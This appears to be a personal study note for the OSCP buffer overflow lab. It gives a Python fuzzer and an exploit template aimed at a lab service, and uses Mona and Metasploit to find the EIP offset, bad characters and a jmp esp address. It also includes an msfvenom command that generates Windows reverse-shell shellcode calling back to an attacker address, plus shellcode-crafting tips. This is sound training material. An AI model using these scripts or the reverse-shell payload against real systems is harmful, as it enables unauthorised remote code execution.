# Binary Exploitation

## OSCP Buffer Overflow
Debugger: Immunity Debugger + Mona python scripts
Configure Mona with `!mona config -set workingfolder c:\mona\%p`. This sets the directory where we can find mona output files.
### 1. Fuzzing
Use python with `sockets` library to send and receive data to service. Send base buffer and increntally send larger input sets until the service crashes.
```python
#!/usr/bin/env python3
# fuzzer.py

import socket, time, sys

ip = "10.10.190.41"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```


### 2. Crash Replication and Controlling EIP
Use another script (exploit.py) for sending payloads.
```python
# exploit.py
import socket

ip = "10.10.190.41"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Prepare a cyclic pattern to send as payload to identify the offset for the __EIP__. The length will be determined by the length necessary to crash the sevice in the previous step. Generate the pattern with metasploit. Set the length 400 bytes larger than the strings used to crash the service. (I think the +400 bytes is arbitrary)
```bash
# cyclic pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <num>
# or non-cyclic pattern
msf-pattern_create -l <num>
```
Identify EIP offset
```
!mona findmsp  -distance <xxx>
```
If mona doesn't pick up anything try a larger pattern. Try adjusting down the offset. Adjust the exploit.py `offset` to match the EIP offset from the previous step. Populate `retn` with "BBBB" and re-run the exploit. EIP should be filled with "B"s (\x42)
### 3. Find Bad Characters Generate a byte array with mona excluding bad characters. Exclude null byte by default.  ```bash
!mona bytearray -b "\x00"
# example with more bad chars
!mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"
```
Python script to generate bytearray.
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```
Run exploit.py with the bytearray payload. Crosscheck the hexdump with the payload to find any bad chars. This can be done manually or with mona. If there are no bad chars, the output status should be "Unmodified".
```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
# <address> refers to the ESP when the service stopped/crashed
```
Remove any bad chars and repeat until the entire payload is sent successfully.

### 4. Find a Jump Point
Use mona to find all the `jmp esp` instructions with addresses that don't contain any of the bad chars.
```bash
!mona jmp -r esp -cpb "\x00"
# example with more bad chars
!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\a1"
```

Replace `retn` in exploit.py with one of the addresses found.
Don't forget to put it in "backwards" since our target has an Intel CPU which is little endian.

### 5. Generate Payload
Generate shell code to be used as payload.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.86.88 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c
```
This creates `c` shell code.
#### NOTE: don't forget to add a nop sled. The payload will most likely need some space in memory to unpack itself.

### 6. Exploit



## Tips and Tricks
### x86_64 Assembly / Shellcrafting
```bash
# Get shell code from objdump
objdump -Mintel -D shell_asm | grep -ioP "[a-z0-9]{6}:\W\K(([a-z0-9][a-z0-9].)*)" | paste -d '' -s | sed 's/\s$//g' | sed 's/^/\\\x/' | sed 's/ /\\\x/g'

# assemble some 64 bit assembly
nasm -f elf64 <file>

# link some assembly
ld <object_file> -o <output_file>

# pwntools shellcraft setreuid to 1002
pwn shellcraft -f d amd64.linux.setreuid 1002
```

